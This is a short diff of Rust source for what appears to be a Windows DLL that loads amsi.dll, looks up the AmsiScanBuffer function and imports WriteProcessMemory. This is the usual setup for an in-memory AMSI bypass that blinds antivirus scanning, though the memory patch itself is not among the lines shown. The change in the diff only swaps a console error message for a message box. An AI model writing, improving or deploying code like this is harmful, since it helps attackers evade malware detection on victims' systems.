@@ -1,6 +1,7 @@
 use std::ffi::c_void;
 use windows::core::{ s, w };
-use windows::Win32::Foundation::HMODULE;
+use windows::Win32::Foundation::{HMODULE, HWND};
+use windows::Win32::UI::WindowsAndMessaging::MessageBoxW;
 use windows::Win32::System::LibraryLoader::{ LoadLibraryW, GetProcAddress };
 use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
 use windows::Win32::System::Threading::{OpenProcess, GetCurrentProcess};
@@ -24,7 +25,14 @@ extern "system" fn DllMain(dll_module: HMODULE, call_reason: u32, _: *mut ()) ->
 fn attach() {
     let result = unsafe { LoadLibraryW(w!("C:\\Windows\\System32\\amsi.dll")) };
     if result.is_err() {
-        println!("Failed to load 'amsi.dll'");
+        unsafe{ 
+            MessageBoxW(
+                HWND(0),
+                w!("Failed to load amsi.dll."),
+                w!("ERROR"),
+                Default::default(),
+            )
+        };
     }
 
     let farproc = unsafe { GetProcAddress(result.unwrap(), s!("AmsiScanBuffer")) };
